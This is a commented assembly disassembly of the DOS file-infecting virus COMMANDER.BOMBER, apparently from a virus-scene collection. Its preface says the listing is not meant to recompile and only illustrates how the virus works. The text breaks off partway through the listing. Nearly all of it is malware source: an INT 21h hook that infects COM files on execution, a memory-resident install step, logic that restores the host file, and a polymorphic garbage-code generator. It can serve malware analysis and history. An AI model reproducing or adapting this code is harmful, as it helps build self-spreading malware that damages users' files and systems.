comment ~
        Hi dudes, just for your information, this dizastering
        of famous COMMANDER.BOMBER virus is not designed for
        recompilation ( you know, I am such a lazy bastard, so
        i didn't take care about relocations and so), or better
        after compilation you 'll not get working virus. :((((
        Actually, this is dizassembly of virus memory dump.
        It should just ilustrate how this virus works and why
        wasn't so much in the wild as it's foreruners.
~








seg000		segment	byte public 'CODE'
		assume cs:seg000
		org 100h
		assume es:nothing, ss:nothing, ds:seg000

start:					; ...
		xor	sp, sp
		sti

loc_0_103:
		call	delta_offset

m_CommanderBomb	db 'COMMANDER BOMBER WAS HERE'

                mov	ax, 3521h
		int	21h		; get old interrpt adress
		mov	word ptr [old_int_21], bx
		mov	word ptr [old_int_21], es
		mov	dx, offset virus_int_21
		mov	ah, 25h
		int	21h		; set our vector
		call	setup_random_se
		mov	ds, ds:2Ch	; DS = enviroment segment
		mov	dx, bp
		push	ds
		pop	es
		assume es:seg000
		mov	ah, 49h
		int	21h		; DOS -	2+ - FREE MEMORY
					; ES = segment address of area to be freed
		push	cs
		pop	es
		mov	bx, 0ACh
		mov	ah, 4Ah
		int	21h		; DOS -	2+ - ADJUST MEMORY BLOCK SIZE (SETBLOCK)
					; ES = segment address of block	to change
					; BX = new size	in paragraphs
		mov	bx, offset exec_parameters
                                        ; BX point to	exec parameter block
		mov	es:[bx+4], es	; set pointer 2	comand line
		mov	es:[bx+8], es	; set pointer 2	FCB1
		mov	es:[bx+0Ch], es	; set pointer 2	FCB2
		mov	ax, 4B00h
		int	21h		; reexec infected file,	but with virus
					; in memory
		jb	go_TSR
		mov	ah, 4Dh
		int	21h		; DOS -	2+ - GET EXIT CODE OF SUBPROGRAM (WAIT)

go_TSR:					; ...
		mov	dx, 0ACh
		mov	ah, 31h
		int	21h		; DOS -	DOS 2+ - TERMINATE BUT STAY RESIDENT

exec_parameters	dw 0			; ...
					; enviroment segment
		dw 80h			; dw pointer 2 cmnd line
		dw 10Bh
		dw 5Ch			; dw pointer 2 fcb1
		dw 10Bh
		dw 6Ch			; dw pointer 2 fcb2
		dw 10Bh

delta_offset:				; ...
		cld
		pop	si
		sub	si, 6		; si now holds delta offset
		push	cs
		pop	ds
		push	ds
		pop	es		; cs=ds=es
		xor	ax, ax
		mov	di, 0FCh
		push	ax
		push	di
		mov	ax, 0A5F3h
		stosw			; CS:FC	F3 A5 repz movsw
		mov	ax, 1FEBh
		stosw			; CS:FE	EB 1F jmp 11F
		mov	ah, 30h		; the code above moves virus to	ds:100
					; and jumps to ds:11f -	virus gets
					; installed
		int	21h		; DOS -	GET DOS	VERSION
					; Return: AL = major version number (00h for DOS 1.x)
		cmp	al, 3
		jb	DOS_under_3
		push	si		; push delta
		xor	si, si
		mov	ds, [si+2Ch]	; PSP:2C holds enviroment segment

look_4_end:				; ...
		lodsw
		dec	si
		or	ax, ax		; look 4 end of	enviroment
		jnz	look_4_end
		lea	bp, [si+3]	; BP points now	to EXEC	string
		pop	si		; pop  delta again
		mov	ax, 'BO'
		int	21h		; ARE YOU HERE call
		cmp	ax, 'MB'        ; notice BO-MB !
		jnz	not_in_memory

in_memory:				; here comes code, if the virus
		mov	dx, bp		; is resident
		mov	ax, 3D02h
		int	21h		; open host for	r/w
		push	es
		pop	ds
		jb	DOS_under_3
		xchg	ax, bx
		mov	ax, 5700h
		int	21h		; get time/date
		jb	close_file
		push	dx		; store	date
		push	cx		; store	time
		push	si
		add	si, 9C0h	; point	to end of virus

look_4_ff_0:				; ...
		lodsw			; di on	start =	0
					; FORMAT of repair table
		inc	ah
		jz	ff_found
		xchg	ax, di
		movsw			; from ds:si to	es:di
		jmp	short look_4_ff_0

ff_found:				; ...
		pop	si
		mov	dx, 100h
		mov	cx, 1000h	; size of stored fragment
		add	cx, [si+110h]	; add size
		mov	ah, 40h
		int	21h		; DOS -	2+ - WRITE TO FILE WITH	HANDLE
					; BX = file handle, CX = number	of bytes to write, DS:DX -> buffer
		xor	cx, cx
		mov	ah, 40h
		int	21h		; truncate file
		pop	cx
		pop	dx
		mov	ax, 5701h
		int	21h		; set original time/date

close_file:				; ...
		mov	ah, 3Eh
		int	21h

DOS_under_3:				; ...
		mov	byte ptr ds:0FFh, 0
		push	si
		add	si, 0BC0h

look_4_ff_1:				; ...
		lodsw
		mov	cx, ax
		jcxz	zero_bytes
		lodsw
		inc	ah
		xchg	ax, di
		rep movsb
		jmp	short look_4_ff_1

zero_bytes:				; ...
		pop	di

                db 0BEh	; ¾		; MOV SI,W
file_size	dw 1400h		; ...

		add	si, 100h

not_in_memory:				; ...
		mov	cx, 800h	; prepare for 4	K block	move
		push	es
		pop	ds		; this code  returns to	repz movsw/jmp 11f
		retn

read_2_buffer:				; ...
		xor	dx, dx
		mov	cx, 61184	; maximal size 2 infect
		mov	ah, 3Fh

emulate_int_21:				; ...
		pushf
		cli
		push	cs
		call	near ptr jmp_old_21
		retn

virus_int_21:				; ...
		cmp	ax, 4B00h
		jz	try_to_infect
		cmp	ax, 'BO'
		jz	are_you_here_?

jmp_old_21	db 0EAh	; ê		; ...
old_int_21	dd 2140EBh		; ...

are_you_here_?:				; ...
		mov	ax, 'MB'
		iret

try_to_infect:				; ...
		mov	cs:saved_ss, ss
		mov	cs:saved_sp, sp
		cli
		mov	ax, cs
		mov	ss, ax
		assume ss:seg000
		mov	sp, 100h	; setup	own stack frame
		sti
		push	es
		push	ds
		push	bp
		push	di
		push	si
		push	dx
		push	cx
		push	bx
		cld
		mov	si, dx
		mov	cx, 50h
		mov	di, si

scan_filename:				; ...
		lodsb
		cmp	al, ':'
		jz	drive_in_path
		cmp	al, '\'
		jnz	other_character

drive_in_path:				; ...
		mov	di, si

other_character:			; ...
		or	al, al
		loopne	scan_filename	; end of ASCIIZ	?
		mov	si, di		; si points 2 filename
		mov	di, 105h
		mov	cl, 7

test_COMMAND:				; ...
		lodsb
		and	al, 0DFh
		inc	di
		cmp	al, cs:[di]
		loope	test_COMMAND	; command  in file name?
		jnz	is_not_command
		lodsb
		or	al, al
		jz	outta_from_here
		cmp	al, '.'
		jz	outta_from_here	; do not infect	comman.com

is_not_command:				; ...
		mov	bx, 1000h
		mov	ah, 48h
		call	emulate_int_21
		jnb	allocated_64_K	; allocate 64 K

outta_from_here:			; ...
		jmp	leave_virus

allocated_64_K:				; ...
		mov	es, ax
		assume es:nothing
		mov	ax, 4300h	; es = allocated segment
		call	emulate_int_21
		jb	free_memory	; get attributes
		shr	cx, 1
		jnb	not_read_only
		shl	cx, 1
		mov	ax, 4301h
		call	emulate_int_21
		jb	free_memory	; clear	+r attribute

not_read_only:				; ...
		mov	ax, 3D02h
		call	emulate_int_21
		jb	free_memory
		xchg	ax, bx		; handle 2 bx
		push	es
		pop	ds
		call	read_2_buffer
		jb	close_victim
		cmp	ax, cx		; maximal size reached ! outta from here
		jz	close_victim
		cmp	ax, 5120	; size is smaller than minimum
		jb	close_victim
		cmp	word ptr ds:0, 'ZM'
		jz	close_victim
		cmp	word ptr ds:0, 'MZ'
		jz	close_victim	; do not infect	exes
		push	ax		; push size
		mov	ax, 5700h
		call	emulate_int_21
		pop	ax		; pop size
		jb	close_victim
		mov	cs:victim_time,	cx
		mov	cs:victim_date,	dx
		push	bx		; store	time, date, handle
		call	try_2_infect
		pop	bx		; pop handle
		push	ax
		xor	cx, cx
		xor	dx, dx
		mov	ax, 4200h
		call	emulate_int_21	; seek BOF
		pop	cx
		jb	close_victim
		mov	ah, 40h
		call	emulate_int_21

                db 0BAh	; º		; mov dx,w
victim_date	dw 188Ah		; ...
		db 0B9h	; ¹		; mov cx, w
victim_time	dw 92CBh		; ...

                mov	ax, 5701h
		call	emulate_int_21

close_victim:				; ...
		mov	ah, 3Eh
		call	emulate_int_21

free_memory:				; ...
		mov	ah, 49h
		call	emulate_int_21

leave_virus:				; ...
		pop	bx
		pop	cx
		pop	dx
		pop	si
		pop	di
		pop	bp
		pop	ds
		pop	es
		cli

                db 0B8h	; ¸		; mov AX, word
saved_ss	dw 10Bh			; ...

                mov	ss, ax
		assume ss:nothing
		db 0BCh	; ¼		; mov SP,W
saved_sp	dw 0FFF8h		; ...

		mov	ax, 4B00h
		jmp	near ptr jmp_old_21

; returns 0 - FF

rnd_less_100h	proc near		; ...
		mov	ax, 100h
		jmp	short rnd_to_AX	; returns random number	less
rnd_less_100h	endp			; than AX


rnd_max_40h:				; ...
		mov	al, 40h		; returns 0 - 3F

unk_0_338	db 0A9h	; ©		; opcode 4 test	ax, word

rnd_max_10h:				; ...
		mov	al, 16		; returns 0 - F

		db 0A9h	; ©		; test ax, word	opcede

rnd_max_8:				; ...
		mov	al, 8		; returns 0 to 7

unk_0_33E	db 0A9h	; ©		; and again ....

rnd_max_4:				; ...
		mov	al, 4		; returns 0 - 3

unk_0_341	db 0A9h	; ©		; once more

rnd_max_3:				; ...
		mov	al, 3		; returns 0 - 2
		db 0A9h	; ©		; again	...

rnd_max_2:				; ...
		mov	al, 2
		cbw

rnd_to_AX:				; ...
		push	dx		; returns random number	less
					; than AX
		push	cx
		push	ax
		call	produce_random	; returns AX
		pop	cx
		xor	dx, dx
		div	cx		; 0:RND_in_AX /	MAX_RND
		xchg	ax, dx		; AX = resuling	random number
		pop	cx
		pop	dx
		or	ax, ax
		retn

try_2_infect:				; ...
		mov	cs:file_size, ax
		mov	di, ax		; store	size 2 DI
		mov	cx, 4096
		sub	ax, cx
		call	rnd_to_AX	; returns random number	less
					; than AX
		add	ax, 32
		mov	cs:read_position, ax; reads 4096 bytes from file.
					; BOF+32 <= read position <= EOF-4064
		mov	si, ax		; si = read position in	buffer
					; di = end of file
		rep movsb		; move selected	block behind EOF
		push	ds
		push	cs
		pop	ds
		mov	start_of_free, ax
		xchg	ax, di		; di - end of app block
					; ax - pointer to free block
		mov	end_app_block1,	ax
		mov	end_app_block2,	ax
		xchg	ax, si
		mov	end_free_blck1,	ax
		mov	end_free_blck2,	ax
		mov	si, 100h	; point	2 virus	start
		mov	cx, 2496	; size
		rep movsb		; di points to start of	freed block in
					; file - we move virus body
		xor	ax, ax
		mov	adress_used, ax
		mov	push_counter, ax; counts # of pushed words
		mov	stack_watch, ax
		mov	lower_limit, ax	; can't generate code below this
					; adress
		mov	table_pointer, di
		add	di, 200h
		mov	mvd_bdy_200_1, di
		mov	mvd_bdy_200_2, di
		pop	ds
		stosw
		stosw			; put on the end  dd 0!
		mov	cs:sp_copy, sp
		xchg	ax, bx
		push	bx
		push	bx		; init stack variables
		call	rnd_max_2
		mov	cs:override_switch, al;	1 - generate SS: CS: override
					; 0 - in 1 of 256 cases	put NOP

trash_generator:			; ...
		xor	si, si		; SI = ?
					; BX = pointer for write in file
		db 0B8h	; ¸		; mov AX,W
end_free_blck2	dw 1403h		; ...

                sub	ax, di
		cmp	ax, 10h
		jb	trash_selector
		mov	ax, bx

                db  3Dh	; =		; cmp AX, W
lower_limit	dw 0			; ...
					; can't generate code below this
					; adress
		jb	trash_selector

                db 0B8h	; ¸		; mov AX,
start_of_free	dw 403h			; ...

                sub	ax, bx
		jb	loc_0_3DF
		cmp	ax, 9
		jb	trash_selector
		jmp	short near ptr unk_0_3E6

loc_0_3DF:				; ...
		mov	ax, bx

                db  3Dh	; =		; CMP AX, word
end_free_blck1	dw 1403h		; ...

		jb	trash_selector

unk_0_3E6	db 0B8h	; ¸		; ...
					; mov AX, word
end_app_block1	dw 2400h		; ...

		sub	ax, bx
		cmp	ax, 9
		jb	trash_selector
		mov	ax, 23		; select 1 of 23 types
		call	rnd_to_AX	; returns random number	less
					; than AX
		shl	ax, 1		; double the value
		xchg	ax, si		; select one of	the garbage types

trash_selector:				; ...
		call	cs:garbage_table[si]
		jmp	short trash_generator

; offsets to all code generation subroutines
garbage_table	dw offset JMP_and_CALL	; ...
		dw offset OPER_R_RM	; aritm&log operation,MOV,CMP reg,reg/mem
		dw offset MOVREG_IMM	; MOV reg, byte	or word
		dw offset OPERAL_IM_MEM	; ??? al, reg/mem
		dw offset PUSH_OR_POPsreg; push	or pop segment register
					; sometimes put	segment	override
		dw offset BYTE_OP_WORD_RG; 1 byte opcodes, operations with
					; 16 bit registers
					; DEC,INC,XCHG AX,reg, PUSH, POP
		dw offset BYTE_OP_WORD_RG; operations with 16 bit registers,
					; one byte long	,DEC reg,INC reg,
					; XCHG AX,reg (NOP included), PUSH reg
					; POP reg.
					; in all cases is SP excluded
		dw offset ONE_BYTE_TRASH; PUSHF,DAA,DAS,AAA,AAS,CBW,CWD,SAHF,
					; LAHF,CMPSB,LODSB,SCASB,XLAT,CMC,STC,
					; CLC,STI,CLI,CLD,STD,CMPSW,LODSW,SCASW
		dw offset AAM_AAD_INreg	; AAM byte, AAD	byte, IN AL, byte port
					; IN AX,byte port
		dw offset PUSH_		; push word on stack
		dw offset XCHG_REG_REG	; exchage register with	register
		dw offset LEA_LDS_LES_	; LEA, LDS, LES	reg16,mem
		dw offset ArOp1_2_Grp1
		dw offset MUL_and_IMUL
		dw offset NOT_and_NEG
		dw offset SHFT_1orCL
		dw offset JCND_LOOP_JSRT; shotr&conditional jumps, loops
					; with lenght of 0 bytes
		dw offset stact_biz
		dw offset MOV_POP_MEM	; mov memory,AX/L, POP memory
		dw offset LG_ARI_MOV_8bit
		dw offset GRP1_to_GRP3
		dw offset ROTATIONS
		dw offset grp_MEM_MEM_iMM

JMP_and_CALL:				; ...
		lahf
		xchg	ax, bp		; store	flags to BP
		call	prepare_stack
		pop	cx
		pop	dx
		call	rnd_max_2
		mov	al, 2
		jz	not_from_select
		mov	ax, bp		; restore flags
		sahf
		mov	ax, 2
		jb	not_from_select
		call	rnd_max_2
		jnz	loc_0_4B4
		pop	si
		or	si, si
		jz	si_is_0
		pop	cs:pop_1
		pop	ax
		mov	cs:stack_watch,	ax
		or	ax, ax
		jz	generate_ret_w
		pop	cs:stack_watch
		push	cs:stack_watch
		inc	cs:stack_watch

generate_ret_w:				; ...
		push	ax
		jmp	short $+2

JIM_Batez	db 0B8h	; ¸		; MOV AX, word
pop_1		dw 0			; ...

                xchg	ax, cs:push_counter
		sub	ax, cs:push_counter
		dec	ax
		call	clear_stack
		mov	ax, cs:push_counter
		sub	ax, cs:stack_watch
		inc	ax
		call	rnd_to_AX	; returns random number	less
					; than AX
		jz	gen_ret_near	; ax - how many	words to pop
		sub	cs:push_counter, ax
		shl	ax, 1		; convert #of words to bytes
		push	ax
		mov	al, 0C2h	; ret word
		call	write_byte
		pop	ax
		call	write_word
		jmp	short set_new_bx

gen_ret_near:				; ...
		mov	al, 0C3h	; retn
		call	write_byte

set_new_bx:				; ...
		add	si, 3		; this sets BX for generation of next
					; instruction
		mov	cs:updte_ins_pntr, si
		xor	ax, ax

not_from_select:			; ...
		jmp	short call_jmp

si_is_0:				; ...
		push	si
		inc	ax

loc_0_4B4:				; ...
		mov	si, cs:push_counter
		push	si
		inc	si
		mov	cs:stack_watch,	si
		push	bx

call_jmp:				; ...
		push	dx
		push	cx
		xchg	ax, bp
		sahf			; put flags back
		pushf
		or	bp, bp
		jz	loc_0_4DF
		mov	ax, bp
		call	rnd_to_AX	; returns random number	less
					; than AX
		mov	al, 0E9h	; generate jmp near
		jnz	is_jmp
		inc	cs:push_counter
		dec	ax		; generate call	near

is_jmp:					; ...
		call	write_byte	; write	opcode
		call	write_word	; and 2	random bytez

loc_0_4DF:				; ...
		lea	ax, [di-4]

                db 0BEh	; ¾		; mov si,word
mvd_bdy_200_1	dw 0			; ...

		sub	ax, si
		mov	[si], ax
		popf

		db 0B8h	; ¸		; mov ax,
read_position	dw 403h			; ...

		jnb	loc_0_4F2
		jmp	compute_jmp_siz

loc_0_4F2:				; ...
		mov	ax, bx		; adress pointer to store next byte
					; - in this case end of	jmp or call
		cmp	ax, cs:lower_limit; can't generate code below this
					; adress
		jb	enough_space?
		cmp	ax, cs:end_app_block1
		jnb	enough_space?
		sub	ax, cs:end_free_blck1
		jnb	loc_0_530
		mov	dx, cs:start_of_free
		cmp	bx, dx
		jnb	enough_space?
		sub	dx, [si+2]
		mov	ax, bx
		sub	ax, cs:lower_limit; can't generate code below this
					; adress
		cmp	ax, dx
		jb	loc_0_529
		mov	ax, [si+2]
		mov	cs:start_of_free, ax
		jmp	short enough_space?

loc_0_529:				; ...
		mov	cs:lower_limit,	bx; can't generate code below this
					; adress
		jmp	short enough_space?

loc_0_530:				; ...
		xchg	ax, dx
		mov	ax, cs:end_app_block1
		sub	ax, [si+2]
		cmp	ax, dx
		jb	loc_0_543
		mov	cs:end_free_blck1, bx
		jmp	short enough_space?

loc_0_543:				; ...
		mov	ax, [si+2]
		mov	cs:end_app_block1, ax

enough_space?:				; ...
		or	bp, bp
		jnz	continue_it

                db 0BBh	; »		; MOV BX,word
updte_ins_pntr	dw 0			; ...
					; put new value	in instruction
					; pointer
		pushf
		jmp	short handle_table

continue_it:				; ...
		call	rnd_max_2
		mov	ax, cs:end_app_block1
		mov	dx, cs:end_free_blck1
		jz	loc_0_56B
		mov	ax, cs:start_of_free
		mov	dx, cs:lower_limit; can't generate code below this
					; adress

loc_0_56B:				; ...
		sub	ax, dx
		sub	ax, 3
		ja	where_2_jmp
		mov	ax, 1

where_2_jmp:				; ...
		call	rnd_to_AX	; returns random number	less
					; than AX
		add	ax, dx

compute_jmp_siz:			; ...
		pushf
		sub	ax, bx		; writ down jmp	size
		mov	[bx-2],	ax
		add	bx, ax

handle_table:				; ...
		mov	cs:mvd_bdy_200_1, di
		xor	ax, ax
		stosw
		mov	ax, bx
		stosw
		popf
		jnb	return
		mov	di, cs:table_pointer
		mov	ah, 0FFh	; put end of block mark	there
		stosw

                db 0BCh	; ¼		; mov SP, word
sp_copy		dw 0			; ...
		db 0B8h	; ¸		; MOV AX,word
end_app_block2	dw 2400h		; ...

return:					; ...
		retn

select_reg_mem:				; ...
		cmp	dl, 8Eh
		pushf
		mov	al, 0
		jz	movsreg__rm
		call	rnd_max_2

movsreg__rm:				; ...
		call	make_opcode	; word or byte register

		xchg	ax, dx
		call	rnd_less_100h	; returns 0 - FF
		popf
		jnz	is_not_sreg
		and	al, 11000111b	; clear	reg field
		push	ax
		call	rnd_max_2
		pop	ax
		jz	is_not_sreg	; ES generated
		cmp	cs:override_switch, 0
		jz	is_not_sreg
		or	al, 11000b	; DS generated

is_not_sreg:				; ...
		shr	dl, 1		; if operation with byte,  is not
					; necessary to check for SP
		jnb	do_not_fix_regs

fix_reg_field:				; ...
		stc			; in ModR/M byte
		pushf
		mov	ah, al
		and	ah, 38h		; get reg field	in ModR/M byte
		cmp	ah, 20h		; SP generated ?
		jnz	skip_SP_fix
		or	al, 8		; can't be SP, put BP there !

skip_SP_fix:				; ...
		popf

do_not_fix_regs:			; ...
		lahf
		call	write_byte
		test	al, 11000000b	; mod field 00 ?
		jnz	not_mod_00	; no,
		and	al, 111b	; get r/m field
		cmp	al, 6		; word displacement ?
		jz	rnd_word
		sahf
		jnb	bx_di_disp	; si in	adressing, jump
		push	sp
		pop	dx
		cmp	dx, sp
		jnz	bx_di_disp
		cmp	al, 7
		mov	ah, 4
		jz	bx_disp		; [bx+(disp)] ?
		cmp	al, 4
		jb	bx_di_disp	; [bp+di=(disp)] ?
		mov	ah, 1
		jz	bx_disp
		mov	ah, 3

bx_disp:				; ...
		sub	[bx-1],	ah
		call	rnd_less_100h	; returns 0 - FF
		and	al, 0C0h
		cmp	al, 0C0h
		jnz	loc_0_60F
		mov	al, 80h

loc_0_60F:				; ...
		or	[bx-1],	al
		or	al, al
		jnz	not_mod_00

bx_di_disp:				; ...
		retn

not_mod_00:				; ...
		and	al, 11000000b
		cmp	al, 40h		; is displacement 8 bit?
		jnz	not_8_bit_disp

rnd_byte:				; ...
		push	sp
		pop	ax
		cmp	ax, sp
		mov	ax, 0FFh
		jz	loc_0_627
		inc	ax

loc_0_627:				; ...
		call	rnd_to_AX	; returns random number	less
					; than AX
		jmp	short write_byte

not_8_bit_disp:				; ...
		cmp	al, 80h
		jnz	locret_0_640

rnd_word:				; ...
		mov	ax, 0FFFFh
		call	rnd_to_AX	; returns random number	less
					; than AX

write_word:				; ...
		call	write_byte
		xchg	ah, al		; AL and the AH
		call	write_byte
		xchg	al, ah

locret_0_640:				; ...
		retn

; selection of 8 bit regs

get_word_reg	proc near		; ...
		call	rnd_max_8	; returns 0 to 7
		cmp	al, 4		; SP generated ?
		jnz	make_opcode	; make opcode and write	it
					; down
		inc	ax		; replace SP with BP

make_opcode:				; ...
		or	al, dl		; make opcode and write	it
get_word_reg	endp			; down



write_byte	proc near		; ...
		push	ax
		xchg	al, [bx]
		stosb			; to es:di
		pop	ax
		inc	bx
		inc	cs:adress_used
		push	si
		mov	si, cs:mvd_bdy_200_1
		inc	word ptr [si]
		pop	si
		retn
write_byte	endp


OPER_R_RM:				; ...
		mov	ax, 12		; aritm&log operation,MOV,CMP reg,reg/mem
		call	rnd_to_AX	; returns random number	less
					; than AX
		xchg	ax, si
		mov	dl, cs:gr_lg_artm_mov[si]
		jmp	select_reg_mem	; 1st opcode byte selected


MOVREG_IMM:				; ...
		mov	dl, 0B8h	; mov ax, ...
		call	rnd_max_2
		jnz	_mov_byte_reg
		call	get_word_reg	; selection of 8 bit regs
		jmp	short rnd_word

_mov_byte_reg:				; ...
		call	rnd_max_8	; returns 0 to 7
		or	al, 0B0h	; mov reg8, byte
		call	write_byte

jmp_2_jmp_rndb:				; ...
		jmp	short rnd_byte

OPERAL_IM_MEM:				; ...
		mov	ax, 10
		call	rnd_to_AX	; returns random number	less
					; than AX
		xchg	ax, si
		call	rnd_max_2
		or	al, cs:grp_al_im8_r8[si]
		call	write_byte
		or	si, si		; mov al/ax,mem	?
		jz	jmp_2_jmp_rndw
		shr	al, 1
		jb	jmp_2_jmp_rndw	; put word immediate
		jmp	short jmp_2_jmp_rndb; put byte immediate

jmp_2_jmp_rndw:				; ...
		jmp	short rnd_word

PUSH_OR_POPsreg:			; ...
		call	rnd_max_3	; returns 0 - 2
		mov	dl, 26h
		jz	no_push		; if ax	= 0 generate segment prefix ES,CS,SS,DS
		mov	dl, 6
		dec	ax
		jz	near ptr try_pop_Sreg; if ax=1 try generate pop	sreg

make_push_sreg:				; ...
		inc	cs:push_counter

no_push:				; ...
		call	rnd_max_4	; returns 0 - 3
		mov	cl, 3
		shl	al, cl
		jmp	short make_opcode; make	opcode and write it

try_pop_Sreg	db 0B8h	; ¸		; ...
					; MOV AX, word
push_counter	dw 0			; ...

		cmp	ax, cs:stack_watch
		jz	make_push_sreg
		inc	dx
		dec	cs:push_counter
		cmp	cs:override_switch, 0
		jz	make_pop_es
		call	rnd_max_2
		jz	make_pop_es
		mov	dl, 1Fh		; 50% probability for POP DS

make_pop_es:				; ...
		xchg	ax, dx

jmp2_write_byte:			; ...
		jmp	write_byte

BYTE_OP_WORD_RG:			; ...
		call	rnd_max_3	; returns 0 - 2
		jz	ax_zero		; probability 33%
		mov	ax, 5
		call	rnd_to_AX	; returns random number	less
					; than AX

ax_zero:				; ...
		xchg	ax, si
		jnz	no_push_or_pop
		mov	ax, cs:push_counter

                db  3Dh	; =		; CMP AX, word
stack_watch	dw 0			; ...

                jz	push_it		; if push_counter = stack_watch
					; cant generate	pop
		dec	cs:push_counter
		dec	si		; pop word to register

push_it:				; ...
		inc	si

no_push_or_pop:				; ...
		call	rnd_max_8	; select target	register
		dec	si
		jz	push_generated
		cmp	al, 4		; exclude sp(xchange 4 bp)
		jnz	generate_code
		inc	ax
		jmp	short generate_code

push_generated:				; ...
		inc	cs:push_counter

generate_code:				; ...
		or	al, cs:group_oper_r16[si]
		jmp	short jmp2_write_byte

ONE_BYTE_TRASH:				; ...
		mov	ax, 23
		push	sp
		pop	dx
		cmp	dx, sp
		jnz	whole_trash
		sub	ax, 3

whole_trash:				; ...
		call	rnd_to_AX	; returns random number	less
					; than AX
		xchg	ax, si
		jnz	select_one_1
		inc	cs:push_counter

select_one_1:				; ...
		mov	al, byte ptr cs:trash_byte_tbl[si]
		jmp	short jmp2_write_byte

AAM_AAD_INreg:				; ...
		mov	dl, 0D4h
		call	rnd_max_2
		jz	AAM_AAD		; AAM
		call	switch_clear	; sometimes generate NOP instead AAM
		mov	dl, 0E4h	; IN AL/AX, port 8bit

AAM_AAD:				; ...
		call	rnd_max_2
		call	make_opcode	; make opcode and write	it
					; down
		call	rnd_less_100h	; returns 0 - FF
		jnz	jmp_2_jmp_2wb
		cmp	byte ptr [bx-1], 0D4h; if AAM generated, 2nd byte can't
					; be 0 !
		jnz	jmp_2_jmp_2wb
		inc	ax		; put 1	there

jmp_2_jmp_2wb:				; ...
		jmp	short jmp2_write_byte

PUSH_:					; ...
		mov	al, 0FFh	; Grp3 r,m16 -next byte
					; contains opcode
		call	write_byte
		call	rnd_less_100h	; returns 0 - FF
		and	al, 11000111b	; clear	reg field
		or	al, 110000b	; set r/m field	to 6 ->	PUSH
		inc	cs:push_counter
		stc
		jmp	do_not_fix_regs

XCHG_REG_REG:				; ...
		call	rnd_max_2
		or	al, 10000110b	; XCHG r,r/m
		call	write_byte
		shr	al, 1
		jnb	byte_xchg
		call	second_opcode	; handle ModR/M	byte

jmpfixregfield:				; ...
		jmp	fix_reg_field	; in ModR/M byte

byte_xchg:				; ...
		call	second_opcode	; handle ModR/M	byte
		jmp	short jmp_2_jmp_2wb

LEA_LDS_LES_:				; ...
		call	rnd_max_3	; returns 0 - 2
		jnz	is_not_zero
		cmp	cs:override_switch, 0
		jnz	is_not_zero
		inc	ax		; generate LDS reg 16, mem

is_not_zero:				; ...
		xchg	ax, si
		mov	al, cs:LEA_LDS_LES[si]
		call	write_byte
		call	rnd_less_100h	; returns 0 - FF
		cmp	al, 11000000b
		jb	do_not_fixmod
		and	al, 3Fh		; clear	mod field (can't generate
					; lea reg,reg

do_not_fixmod:				; ...
		jmp	short jmpfixregfield

ArOp1_2_Grp1:				; ...
		call	rnd_max_8	; returns 0 to 7
		jz	loc_0_7C0
		call	rnd_max_4	; returns 0 - 3
		push	ax
		or	al, 80h		; ArOp1(2) r/m,imm8/16
		call	write_byte
		shr	al, 1		; CY = 1 if operation with word
		call	byte_xchg

test_4_word:				; ...
		pop	ax
		dec	ax
		jz	jmprndword
		jmp	rnd_byte

jmprndword:				; ...
		jmp	rnd_word

loc_0_7C0:				; ...
		call	rnd_max_2
		push	ax
		or	al, 0F6h	; grp1 r/m8(16)
		call	write_byte
		call	rnd_max_8	; returns 0 to 7
		or	al, 11000000b

loc_0_7CE:				; TEST	reg,reg
		call	write_byte
		jmp	short test_4_word

second_opcode:				; ...
		pushf			; handle ModR/M	byte
		call	rnd_max_40h	; This generation may cause
					; problems & possible virus hang !!!
					; on following returns:
					; ArOp2	: 001???,100???,110???
					; Shftop: 110???
					; Grp1:	001???
					; Grp2:	111???
					; Grp3:	only 000???, 001??? re	correct(this is	generated not this way and can fail)
		popf
		jnb	not_word_size
		mov	ah, al
		and	ah, 7		;  SP generated	?
		cmp	ah, 4
		jnz	not_word_size
		inc	ax		; fix it to BP

not_word_size:				; ...
		or	al, 11000000b	; set mod field	2 11 - 2nd oper
					; is reg
		retn

MUL_and_IMUL:				; ...
		call	rnd_max_2
		or	al, 0F6h	; Grp1
		call	write_byte
		xchg	ax, dx
		call	rnd_less_100h	; returns 0 - FF
		and	al, 11001111b
		or	al, 100000b	; IMUL or MUL
		shr	dl, 1
		jmp	do_not_fix_regs

NOT_and_NEG:				; ...
		call	rnd_max_2
		pushf
		or	al, 0F6h	; grp 1
		xchg	ax, dx
		call	rnd_max_10h	; returns 0 - F
		mov	ah, dl
		or	al, 11010000b	; NOT,NEG reg, reg
		popf
		jz	byte_operation
		mov	dl, al
		and	dl, 111b
		cmp	dl, 4		; SP generated ?
		jnz	byte_operation
		inc	ax		; so put BP there !

byte_operation:				; ...
		xchg	al, ah

jmp_write_word:				; ...
		jmp	write_word

SHFT_1orCL:				; ...
		call	rnd_max_4	; returns 0 - 3
		or	al, 0D0h
		call	write_byte	; shftop r/m8(m16),1(cl)
		shr	al, 1
		pushf
		call	rnd_max_40h	; returns 0 - 3F
		popf			; if is	return 2? then is invalid
					; instruction generated	!!!!!!!!!
		jnb	operand_word
		mov	ah, al
		and	ah, 7
		cmp	ah, 4		; SP generated ?
		jnz	operand_word
		inc	ax		; replace with BP

operand_word:				; ...
		or	al, 11000000b

jmpwritebyte:				; ...
		jmp	write_byte

clear_stack:				; ...
		push	cx
		mov	cl, 58h		; pop word reg
		dec	ax
		jz	clear_1_word
		dec	ax
		jz	clear_2_word
		inc	ax
		inc	ax
		jz	clear_0_word
		mov	cl, 50h		; push word
		inc	ax
		jz	clear_1_word
		inc	ax
		jz	clear_2_word
		dec	ax
		dec	ax
		shl	ax, 1
		mov	cx, ax
		cbw
		cmp	ax, cx		; can be used conversion b->W ?
		pushf
		call	rnd_max_2
		mov	ax, 0C483h	; add sp, word #
		jz	use_add_sp
		mov	ah, 0ECh	; sub sp, word #
		neg	cx

use_add_sp:				; ...
		popf
		jnz	no_conversion	; without conversion
		call	write_word	; use conversion
		xchg	ax, cx
		pop	cx
		jmp	short jmpwritebyte

no_conversion:				; ...
		mov	al, 81h		; without conversion
		call	write_word
		xchg	ax, cx
		pop	cx

jmp2jmpwritewor:			; ...
		jmp	short jmp_write_word

clear_2_word:				; ...
		call	check_POP

clear_1_word:				; ...
		call	check_POP

clear_0_word:				; ...
		pop	cx
		retn


check_POP:				; ...
		call	rnd_max_8	; returns 0 to 7
		or	al, cl
		cmp	al, 5Ch		; POP SP  ?
		jnz	jmpwritebyte
		mov	al, 7		; xchange for POP DI
		jmp	short jmpwritebyte


JCND_LOOP_JSRT:				; ...
		cmp	cs:stack_watch,	0
		jz	this_is_enabled
		call	rnd_max_4	; returns 0 - 3
		jnz	locret_0_8C8	;  !=0 -> exit

